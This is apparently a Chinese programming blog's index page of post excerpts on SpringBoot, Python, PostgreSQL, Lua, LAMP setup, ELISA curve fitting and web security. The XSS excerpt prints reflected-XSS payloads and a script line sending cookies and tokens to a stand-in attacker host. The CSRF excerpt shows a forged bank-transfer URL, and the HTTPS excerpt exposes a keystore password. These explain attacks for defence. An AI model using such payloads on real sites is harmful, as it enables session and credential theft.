	<div class="content list__excerpt post__content clearfix">
		跟着狂神SpringBoot融合异步,定时,邮件任务 异步,定时,邮件任务前言 在我们的工作中，常常会用到异步处理任务，比如我们在网站上发送邮件，后台会去发送邮件，此时前台会造成响应不动，直到邮件发送完毕，响应才会成功，所以我们一般会采用多线程的方式去处理这些任务。还有一些定时任务，比如需要在每天凌晨的时候，分析一次前一天的日志信息。还有就是邮件的发送，微信的前身也是邮件服务呢？这些东西都是怎么实现的呢？其实SpringBoot都给我们提供了对应的支持，我们上手使用十分的简单，只需要开启一些注解支持，配置一些配置文件即可！那我们来看看吧~
最后编辑于2020.3.26 作者：狂神说
异步任务 1、创建一个service包
2、创建一个类
AsyncService
异步处理还是非常常用的，比如我们在网站上发送邮件，后台会去发送邮件，此时前台会造成响应不动，直到邮件发送完毕，响应才会成功，所以我们一般会采用多线程的方式去处理这些任务。
编写方法，假装正在处理数据，使用线程设置一些延时，模拟同步等待的情况；
@Service public class AsyncService { public void hello(){ try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println("业务进行中...."); } } 3、编写controller包
4、编写AsyncController类
我们去写一个Controller测试一下
@RestController public class AsyncController { @Autowired AsyncService asyncService; @GetMapping("/hello") public String hello(){ asyncService.hello(); return "success"; } } 5、访问http://localhost:8080/hello进行测试，3秒后出现success，这是同步等待的情况。
问题：我们如果想让用户直接得到消息，就在后台使用多线程的方式进行处理即可，但是每次都需要自己手动去编写多线程的实现的话，太麻烦了，我们只需要用一个简单的办法，在我们的方法上加一个简单的注解即可，如下：
6、给hello方法添加@Async注解；
//告诉Spring这是一个异步方法 @Async public void hello(){ try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d7c82a5233f94ca47afe43bfa6840f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d7f479e9ec1d0a7d024cbe1576c9070/" rel="bookmark">
			Python-多线程与线程池的基本操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		01创建线程方式1 import threading import time # 相关文档 # https://docs.python.org/zh-cn/3/library/threading.html def loop(): print(threading.currentThread().getName()) n = 0 while n &lt; 5: print(n) time.sleep(1) n += 1 def use_thread(): print(threading.currentThread().name) t = threading.Thread(target=loop, name="now_thread_loop") t.start() # t.join() print("xxx") if __name__ == '__main__': use_thread() 01创建线程方式2 import threading import time # 自定义创建线程实现类 实现多线程使用 class myThread(threading.Thread): def run(self): n = 0 while n &lt; 5: print("当前异步线程的名称是[{0}]".format(threading.currentThread().getName())) print(n) time.sleep(0.5) n += 1 if __name__ == '__main__': t=myThread(name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d7f479e9ec1d0a7d024cbe1576c9070/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66ac17747b947b61a066369384896c79/" rel="bookmark">
			2020-11-04
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		换行与缩进1条代码为1行，例如：1个赋值、1个请求、1个运算、1个打印，结尾不需要添加任何标点符号。 根据代码的执行逻辑进行区分，同一级别的代码需要保持对齐，对与不同级别的代码进行缩进即可。 根据PEP的规定，必须使用4个空格来表示每级缩进（不清楚4个空格的规定如何，在实际编写中可以自定义空格数，但是要满足每级缩进间空格数相等）。 2.单行注释和多行注释 单行注释 #。 多行注释，前后三个单引号或双引号’’’… ‘’’; “”" …"""。… 为需要解释的内容。 两种不同的执行方式 直接调用 Python 解释器执行文件。Python test.py 修改test.py文件的属性，为可执行，在用 ./ 执行test.py文件。 chomd +x test.py ./test.py 数据类型和变量Python 的数据类型有 int(整数)、float(浮点数)、字符串、布尔值、None、列表、元组、字典、集合等。 变量不需要声明，可以直接输入。大小写敏感。 内置函数type(),可以查询变量的数据类型。 var = 8print(var) # 8print(type(var)) # &lt;type ‘int’&gt; 整数类型 字符串是以’'和""括起来的任意文本。 var = ‘shiyanlou’var = “learn by doing” 布尔值（Ture，False）可以用and，or，not 运算。 多变量赋值。 a = b = c =1a , b ，c = 45 ,54 ，‘shiyanlou’ # 等号两边都是元组x,y =y,x #两值交换 赋值语句不可以返回值，对象是通过引用传递的。 5.运算和表达式表达式由运算符和操作数组成，像 2+3 就是一个表达式，其中 2 和 3 是操作数，加号是运算符。 算术运算 运算符的优先级按照从低到高排序，同一行优先级相同 加（+）、减（-） 乘（*）、除（/）、取整（//）、求余（%） 乘方（**） 乘方（**） 右结合 223=256
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66ac17747b947b61a066369384896c79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4669753228300f0d9455cc6c0ac55ca/" rel="bookmark">
			分享一些可以调研B端产品的网站，建议收藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何调研B端产品是一个让人很头疼的问题。不像To C产品那样，随时可以下载，随时可以体验。是不是非常希望想找到所有行业内的B端产品清单，并且能快速了解他们的产品。今天，我编译一篇汇总了7个可以做B端产品调研的网站，可以快速帮助你分门别类的找到SaaS、B端产品。
1. FinancesOnline.com Financesonline.com 被认为是增长最快的 B2B &amp; SaaS 评论平台，每月吸引超过250万的访问者。这些人都在这个网站寻找业务和生产力解决方案。该网站以 B2B 公司和小型企业为目标，拥有数百个软件类别，数据库不断扩大，由技术专家和 SaaS 专家组成的团队提供了7000多份软件评论。这些评论主要关注产品的可用性、特性、价格和其他信息，并通过其独特的 SmartScore 系统进行评级。
基于产品的属性和性能，网站上产品需要与其他类似的软件进行比较分析。通常，网站提供了特定解决方案的替代方案，也有根据审查团队设定的因素而评出的顶级产品。还有许多关于优化软件使用的指南和资源，以及关于简化小企业业务功能和流程的提示。
该网站还为您的 B2B 和 SaaS 产品提供了广泛的营销服务，这将帮助提升网站所列产品的信任度，并产生更多的入站流量。如果网站中的软件给评审团队留下了深刻的印象，并且通过了他们的评级和分数，那么它可以携带一个验证质量标签，标志着这个产品是一个拥有高质量产品的可靠供应商。产品会在软件所属的类别中排名靠前。
2. G2.com G2 Crowd 通过让产品客户自己给出他们对使用软件进行评价，从而来突出客户的声音。他们已经积累了超过60万条经过认证的用户评论，这些评论对顶级产品给予了五星的评价。因为是用户自己根据他们的体验来评估产品，所以你可以直接从重要的人那里得到独立和诚实的评论。通过这种方式，你可以客观地评估用户喜欢或者不喜欢某个产品，以及他们从中得到了什么好处。G2 Crowd 还提供商业和营销服务，包括管理咨询、入站和出站营销以及 B2B 服务。
3. saasgenius.com Saasgenius 旨在使寻找合适的商业软件的过程尽可能的简单直接。正如其名称所示，其收录的软件目录主要关注 SaaS的特性、规格、定价以及类似产品和替代产品的基本信息。软件评论也有一个5星评级系统，由平台的编辑完成，但他们也允许产品用户、公司所有者和专业人士进行简短的评价，突出他们对软件的喜好和不喜欢。
4. Capterra.com Capterra 是一个非常受欢迎的网站，拥有最大的软件评论和信息目录之一。它旨在帮助公司找到正确的商业软件，有效地将客户与正确的供应商联系起来。通过强大的搜索和过滤工具可以帮助您从700多个软件类别中找到符合您业务需求的产品，从而帮助您快速找到您想要的东西。在软件页面中，你可以找到基本的产品细节、星级评分和来自产品用户的评论，列举了软件的优缺点和整体印象。 该网站还为买家提供购买指南、博客文章、前20名报告以及其他有用的资源。另一方面，供应商可以创建自己产品的免费列表，或者利用平台的营销和广告服务。
5. SoftwareAdvice Softwareadvice 通过将客户和他们的需求与网站专家顾问提名的供应商进行匹配，简化了软件的选择。有超过500个软件类别和每个产品页面的软件概述，以及来自真实用户的5星评级系统。评审的重点是基于易用性、功能性、物有所值和客户支持的软件的优缺点。该网站的一个独特之处在于，访问者可以从该公司的软件分析师团队获得免费的电话咨询，帮助购买者选择最可靠的系统，以满足他们的需求。这在软件购买者和销售者之间建立了强有力的联系，前者得到了专家的建议，后者得到了有利可图的机会。
6. fitsmallbusiness.com Fitsmallbusiness 旨在为数百万小企业提供技术解决方案。它提供销售、市场营销、财务、会计和人力资源等领域的研究、调查和专家建议，使其不仅仅是一个软件目录网站，还成为中小企业的商业知识中心。它有一个关于如何创业的专门的资源页面，为初学者提供创业的想法，以及关于金钱问题的来龙去脉。它提供了由行业专家、专业人士和实际的小企业主完成的解释、买家指南和软件解决方案评审。该网站包含了几十个软件类别，每个产品都经过了编辑和产品用户的评估，并且基于特性和功能进行了评级。当你购买网站提供的产品或服务时，FitSmallBusiness 会收取联盟佣金，这些佣金用于维护网站，并保证网站对访问者免费。
7. technologyadvice.com 技术建议通过三个步骤消除了软件研究的麻烦——根据你的需求搜索和过滤产品，阅读产品评论和买家指南，并从专家那里获得价格细节和建议。这个目录带来了超过1500种软件类别的产品，你可以浏览。产品页包含由编辑准备的描述和由产品用户撰写的评论。该软件根据四个主要属性从1星到5星打分，并由回答产品最佳特性、改进领域、业务问题解决和实现效益以及推荐产品可能性等四个问题的用户进行评估。此外，它还有技术顾问随时待命，随时准备在你访问网站的那一刻回答你的任何疑问。该平台同样为产品供应商提供促销计划。
这些网站的初衷，是让添加到上面产品获得最大的曝光度，以帮助推广和销售产品。同时这些网站，也为调研B端产品提供了索引和目录。
原文链接：https://comparecamp.com/where-to-list-b2b-saas-software-products-heres-top-10-review-directories/
以上为李宽老师供稿，推荐李宽老师的新书，大家可在评论区留言评论，点赞数量前3的同学，可以各领取《B端产品经理必修课2.0》作者签名书1本，规则如下：
点赞活动时间截止到本周四晚12点
若出现相同点赞数，按照留言时间顺序发放（早留言，早发放）
中奖同学请添加我的微信：chanpin628
没抢到签名书的也不用捉急，可通过链接直接购买。
此外我们的官方网站也上线了，每日分享高质量的文章、原型素材和行业报告，小伙伴可自行前往索取，支持搜索，需要的小伙伴可点击底部的阅读原文直接查看，或者复制网址：www.dadaghp.com 打开。
更多干货可关注微信公众号：产品刘
想学习更多关于产品、职场、心理、认知等干货，可长按右边二维码，关注我们。
··················END··················
RECOMMEND
推荐阅读
这些是实际面试中遇到的面试题
线下实战2.0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f4669753228300f0d9455cc6c0ac55ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92e0352722f0a9625e467e16c3d44d00/" rel="bookmark">
			【Postgresql 基础】查询昨天、本周、本月、上月、本年统计数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 1、获取当前系统时间2、获取当前日期或时间3、查询昨天的数据4、查询本周的数据5、获取本月、上月数据6、获取本年数据 1、获取当前系统时间 select now(); select current_timestamp; 结果：2020-11-04 16:09:53.247825+08 # now()/current_timestamp展示当前系统的时间，日期格式 2、获取当前日期或时间 select current_date; 结果：2020-11-04 select current_time; 结果：16:14:08.501182+08 3、查询昨天的数据 select DISTINCT count(id) from tablexx where coalesce(l.join_date,l.sys_createdate) &gt;= current_date - 1; # 这里的coalesce函数，语法：coalesce(expr1,expr2,expr3...) # 如果第一个字段存在就用第一个进行表达式判断； # 如果第一个不存在为null则用第二个进行表达式判断； # 如果都没有null则返回null 4、查询本周的数据 # 查询某个时间的周一 SELECT ( DATE '2020-10-23' - INTERVAL '1 day' - ( EXTRACT ( dow FROM ( DATE'2020-10-23' - INTERVAL '1 day' ) ) - 1 || ' day' ) :: INTERVAL ) :: DATE; # 减1 是因为得到的是以周一是星期的开始 # 查询本周的数据 SELECT( DATE ( now() ) - ( EXTRACT ( dow FROM DATE ( now() ) ) - 1 || ' day' ) :: INTERVAL ) :: DATE startasy, ( DATE ( now() ) - ( EXTRACT ( dow FROM DATE ( now() ) ) - 1 || ' day' ) :: INTERVAL ) :: DATE + 6 endday from table d LIMIT 5; # 本周周末 SELECT to_char(CURRENT_DATE +cast(-1*(TO_NUMBER(to_char(CURRENT_DATE,'D'),'99')-2)+6 ||' days' as interval),'yyyy-mm-dd'); 5、获取本月、上月数据 # 本月,方式一 select to_char((SELECT now() as timestamp),'mm'); # 本月,方式二 select * from table where time &gt;= date_trunc( 'month', now() ); # 获取上月 select to_char((select now() - interval '1 month'),'mm'); 6、获取本年数据 # 获取今年 select to_char((SELECT now() as timestamp),'yyyy') # 获取去年 select to_char((select now() - interval '1 years'),'yyyy') 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c3654e1625855ef85aed4394d25b734/" rel="bookmark">
			卡特兰数相关整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		卡特兰数 计算公式 卡特兰数的递推公式是：
C（0）= 1 C（1）=1
C(n) = C(0) C(n-1) + C(1) C(n-2) + …… + C(n-1) C(0) （注意里面的加起来是n-1，因为算是n个里面选定了一个，剩下的个数就是n-1）
即
计算结果：
但是就是要分清楚题目给的n到底是什么含义，到底是n还是2n，真正算下去列出来的式子是怎么样的。
常见问题：（1）（2）（3）（7）（9）（10）（11）（12）是一类，都是01序列类，可以直接分析列式的。（4）（5）（6）（8）是一类，需要列出递归式来求的。当然，在本质上，以上所有问题均能抽象为一种问题：一种通解符合卡特兰数列的问题。
n对括号 有多少种组合矩阵链乘，依据乘法结合律，不改变其顺序，只用括号表示成对的乘积，有几种括号化的方案n个元素入栈 有多少种出栈顺序凸多边形通过互不相交的对角线划分，求划分方案数在圆上选择2n个点，将这些点连接起来，使得所得到的n条线段不相交的方法数2n边的凸多边形，连接对角线 可以分出三角形的个数n × n格点中不越过对角线的单调路径的个数(上班路线选择问题)给定n个节点组成二叉搜索树个数（或组成的二叉树形态数）2n个高矮不同的人 站成两排 保证后排对应的人比前排高 每排从左到 右越来越高 有多少种排列方式《编程之美》4.3中的买票找零问题：2n个人排队买票，其中n个人持50元，n个人持100元。每张票50元，且一人只买一张票。初始时售票处没有零钱找零。请问这2n个人一共有多少种排队顺序，不至于使售票处找不开钱（腾讯笔试）在图书馆一共6个人在排队，3个还《面试宝典》一书，3个在借《面试宝典》一书，图书馆此时没有了面试宝典了，求他们排队的总数？（阿里笔试）说16个人按顺序去买烧饼，其中8个人每人身上只有一张5块钱，另外8个人每人身上只有一张10块钱。 烧饼5块一个，开始时烧饼店老板身上没有钱。 16个顾客互相不通气，每人只买一个。 问这16个人共有多少种排列方法能避免找不开钱的情况出现。 序列类问题 可以抽象为寻找符合若干条件的0-1序列的数量 （这个条件就是要根据题目要求来分析，比如什么一定要在什么前面）
这类问题的解法很巧妙，没有构造递推，直接得出通项公式
路径数目 问题：求在N*N个格点中不越过对角线的单调路径的个数
这个路径需要满足的条件：（用数学、公式什么的来描述清楚问题）
String[i]=[X|Y]String.length=2nX与Y数量相等，均为n。所有的前缀字串(首项为String[0]的子串)皆满足X的个数大于等于Y的个数 （才能不越过对角线） ​ 满足(1)(2)(3)项的String的数量我们已经计算出为C(2n)(n)个，现考虑计算该集合下不满足(4)的情形的数量，然后减去该种情况，得到最终结果。
​ 现从头遍历一个不满足(4)的String，记为BadStr，当遍历到第2m+1位上时有m+1个Y和m个X（容易证明一定存在这样的情况），则后面剩下的部分中必有n-m个X和n-m-1个Y。将第2m+2位及其以后的部分做以下变换：X变成Y、Y变成X，则该部分的X现在有n-m-1个，Y有n-m个，变换后字符串记为cBadStr中共有n+1个Y和n-1个X的二进制数。注意到，对于每个BadStr，均一一对应与一个这样的cBadStr，因此NumOf(BadStrs) = NumOf(cBadStrs)=C(2n)(n−1)。因此满足(1)~(4)的String数量为C(2n)(n)−C(2n)(n−1)。
出入栈问题 问题：对于一个无限大的栈，一共n个元素，请问有几种合法的入栈出栈形式。
​ 就可以转化为01序列的问题，用1表示进栈，用0表示出栈。整个序列里的0和1的个数相等，且整个序列里任何位置，从开始到这个位置的1的个数一定得大于等于0的个数。跟上一题是一样的。
矩阵链乘（组括号）问题 问题：P=A1×A2×A3×……×An，依据乘法结合律，不改变其顺序，只用括号表示成对的乘积，试问有几种括号化的方案？
​ 同样转化为01序列的问题，用1表示左括号，0表示右括号。就是从左到右扫描，无论扫描到任何位置，左括号数一定要大于或者等于右括号数。
​ n个矩阵需要连乘(n-1)次，因此需要(n-1)对括号。且这里的括号只是为了使矩阵两两结合，而不是单纯为加括号而加括号，像( (a1) * (a2))，这里将两个矩阵分别括起来是不符合要求的。因此这里如果确定了括号的顺序，那么矩阵的结合顺序也会确定，如(()())对应了(( a1* a2) * (a3 * a4))。注意到是(n-1)对括号，即(n-1)个左括号和(n-1)个右括号，那么应该使用f[2(n-1)]来计算。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c3654e1625855ef85aed4394d25b734/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0430bc6fc117864635e8d76c4543d845/" rel="bookmark">
			linux 安装lua
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 linux 安装lua 新建目录 放置压缩包 cd /usr/local mkdir server 下载压缩包 解压文件 curl -R -O http://www.lua.org/ftp/lua-5.3.5.tar.gz tar zxf lua-5.3.5.tar.gz 进入lua目录 进行安装 cd lua-5.3.5 make linux test 注意：此时安装，有可能会出现如下错误：
此时需要安装lua相关依赖库的支持，执行如下命令即可：
yum install libtermcap-devel ncurses-devel libevent-devel readline-devel 此时再执行lua测试看lua是否安装成功
[root@localhost ~]# lua Lua 5.1.4 Copyright (C) 1994-2008 Lua.org, PUC-Rio 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae71544145f3ed886aac85f31534aae3/" rel="bookmark">
			Centos7部署LAMP平台与应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Centos7部署LAMP平台与应用 LAMP平台部署与应用 安装顺序：Linux，Apache，Mysql，PHP
Apache服务和Mysql服务先后顺序无所谓，但PHP必须最后安装
1.安装apache 实验材料
一台Centos7机器，担任apache服务和dns服务器：192.168.1.2
一台win7客户端来进行验证：192.168.1.20
Apache源码包
https://pan.baidu.com/s/1iSG4R8cw8G5PzG47Ik2x6A
提取码：yern
挂载光盘并搭建yum源
[root@localhost ~]# mkdir /media/cdrom（创建挂载目录）
[root@localhost ~]# mount /dev/cdrom /media/cdrom（挂载）
安装httpd服务 1.准备工作 rpm -e httpd --nodeps (卸载原来的httpd，不然会冲突）
为了避免系统存在一些依赖性包没有安装的问题，可以使用 yum 安装这些软件包
yum -y install apr apr-devel cyrus-sasl-devel expat-devel libdb-devel apr-util-devel apr-util pcre-devel pcre openldap-devel
2.源代码编译及安装Apache [root@localhost ~]# rz
z waiting to receive.**B0100000023be50
[root@localhost ~]# ls
anaconda-ks.cfg initial-setup-ks.cfg 模板 图片 下载 桌面
httpd-2.4.25.tar.gz 公共 视频 文档 音乐
[root@localhost ~]# tar zxf httpd-2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae71544145f3ed886aac85f31534aae3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfdfc9499ca1149d3c4351594ebc5b44/" rel="bookmark">
			深度学习matlab 二次函数拟合 图书_6 款曲线，解决 99% 的 ELISA 数据拟合难题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们通常 ELISA 实验完成后，后面最重要的工作就是如何把 OD 值转化为浓度，以达到分析数据的目的。样本浓度的分析是根据标准品数据所生成的标准曲线完成的。要确保样本结果的准确性，首先就要保证标准曲线尽量能还原抗原抗体的动力学反应过程。
目前，我们常用的方法是 excel 绘图，或者用绘图专用软件 curve 软件做图。常用的函数 excel 都能归纳，但是 excel 能归纳的曲线模型比较有限，而专业的 curve 软件能拟合的回归曲线就比较多也比较全面。所以目前专业的 curve 软件是目前最流行的数据处理软件之一。
我们常用的曲线拟合回归方程主要为以下 6 种：
1、直线拟合回归方程：
直线回归是最简单的回归模型, 也是最基本的曲线拟合回归分析方法， 将所有的测试点拟合为一条直线，其拟合函数方程式为：y=a+bx
2、二次多项式拟合回归方程：
二次多项式成抛物线状，开口向下或者向上，在很多 ELISA 实验中，拟合近似于二次多项式的升段或者降段，由于曲线的特性，同一个浓度值在曲线图上可能表现出没有对应的 OD 值、有一个 OD 值，或者两个 OD 值，所以使用二次多项式拟合时，最好保证取值的范围都落在曲线的升段或者降段，否则哪怕是相关系数很好也很可能与实际的值不一致。其拟合函数方程式为：y = a+bx+cx2 ，形状如下图：
3、三次多项式拟合回归方程：
三次多项式像倒状的「S」形，在实验结果刚好在曲线的升段或者降段的时候，效果还可以，但是对于区间较广的情形, 由于其弯曲的波动，三次方程拟合模拟不一定很好，跟二次方程拟合一样，看曲线的相关系数的同时也要看计算的点在曲线上的分布，这样才算出理想的结果，本软件计算值时，选择性的取相对于浓度或者 OD 值，比较符合实际的那个结果，而没有将多个结果列出。拟合函数方程式为：y= a+bx+cx2+dx3，形状如下图：
4、半对数拟合回归方程：
半对数拟合即将浓度值取对数值，然后再和对应的 OD 值进行直线回归，理想的状态下，在半对数坐标中是一条直线，常用于浓度随着 OD 值的增加或者减低呈对数增加或者减少的情况，即浓度的变化比 OD 值的变化更为剧烈。在 ELISA 实验中较常用（有很多用 EXCEL 画图时，也常使用半对数），拟合函数方程式为：y = alg(x)+b ，形状如下图（注意其 X 轴是对数坐标）：
5、Log-Log 拟合回归方程：
Log-Log 拟合和半对数相似, 只是将 OD 值和对应的浓度值均取对数，然后再进行直线回归，拟合函数方程式为：lg(y) = alg(x)+b ，形状如下图：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfdfc9499ca1149d3c4351594ebc5b44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6efa20a07de7a3e5913f15db5fadbd80/" rel="bookmark">
			https 请求 调用 http接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.首先去腾讯云或者阿里云申请免费ssl证书 不要自己生产 ,不然无法在服务器上使用
2. 获取证书之后 会生成一个 压缩包 打开 tomcat 的 文件 会有一个 text 文件 和 jks 文件
3.因为springboot使用的是内置tomcat，所以我这边选择tomcat文件，在resources目录下导入xxx.jks
密码在同文件夹的keystorePass.txt中
server: port: 10001 ssl: key-store: classpath:xxxxx.com.jks key-password: u1u7497mw9835c key-store-type: JKS 4.编写配置类
@Configuration public class TomcatConfig { @Bean TomcatServletWebServerFactory tomcatEmbeddedServletContainerFactory() { TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory(){ @Override protected void postProcessContext(Context context) { SecurityConstraint constraint = new SecurityConstraint(); constraint.setUserConstraint("CONFIDENTIAL"); SecurityCollection collection = new SecurityCollection(); collection.addPattern("/*"); constraint.addCollection(collection); context.addConstraint(constraint); } }; factory.addAdditionalTomcatConnectors(createTomcatConnector()); return factory; } private Connector createTomcatConnector() { Connector connector = new Connector("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6efa20a07de7a3e5913f15db5fadbd80/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/494a3837481f7be090210d93fe45bae5/" rel="bookmark">
			XSS攻击原理&amp;解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器
执行，达到攻击的目的，形成了一次有效XSS攻击，一旦攻击成功，它可以获取用户的联系人列
表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实
施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨
大的，是web安全的头号大敌。
攻击的条件 实施XSS攻击需要具备两个条件：
需要向web页面注入恶意代码；这些恶意代码能够被浏览器成功的执行。 看一下下面这个例子：
&lt;div id="el" style="background:url('javascript:eval(document.getElementById("el").getAttribute("code")) ')" code="var a = document.createElement('a'); a.innerHTML= '执行了恶意代码';document.body.appendChild(a); //这这里执行代码 "&gt;&lt;/div&gt; 这段代码在旧版的IE8和IE8以下的版本都是可以被执行的，火狐也能执行代码，但火狐对其禁止访问DOM对象，所以在火狐下执行将会看到控制里抛出异常：document is not defined （document是没有定义的）
再来看一下面这段代码：
&lt;div&gt; &lt;img src="/images/handler.ashx?id=&lt;%= Request.QueryString["id"] %&gt;" /&gt; &lt;/div&gt; 相信很多程序员都觉得这个代码很正常，其实这个代码就存在一个反射型的XSS攻击，假如输入下面的地址：http://www.xxx.com/?id=" /&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;br x="，最终反射出来的HTML代码：
&lt;div&gt; &lt;img src="/images/handler.ashx?id=" /&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;br x="" /&gt; &lt;/div&gt; 也许您会觉得把ValidateRequest设置为true或者保持默认值就能高枕无忧了，其实这种情况还可以输入下面的地址达到相同的攻击效果：http://www.xxx.com/?id=xx" onerror="this.onload()" onload="alert(/xss/)" x="
根据XSS攻击的效果可以分为几种类型 XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击。 XSS攻击能做些什么 读取用户未公开的资料，如邮件列表或者内容、系统的客户资料，联系人列表、窃取cookies、本地存储等等发送到黑客的服务器上，如下面的代码：
javascript var i=document.createElement("img"); document.body.appendChild(i); i.src = "http://www.hackerserver.com/?c=" + document.cookie + "&amp;token=" + localStorage.get("token");
解决方法 一种方法是在表单提交或者url参数传递前，对需要的参数进行过滤,请看如下XSS过滤工具类代码
import java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/494a3837481f7be090210d93fe45bae5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/855751be190282dd6fcebc589b80ea60/" rel="bookmark">
			CSRF攻击原理&amp;防御方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSRF概念 CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。
例如：Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。
CSRF攻击攻击原理及过程如下：
用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 CSRF攻击实例 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。
黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。
这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/855751be190282dd6fcebc589b80ea60/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a808f85d08b6fcb13718ea8ed610e70/" rel="bookmark">
			pycharm 报错 error: unrecognized arguments: --html=./report.html
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错截图
代码：
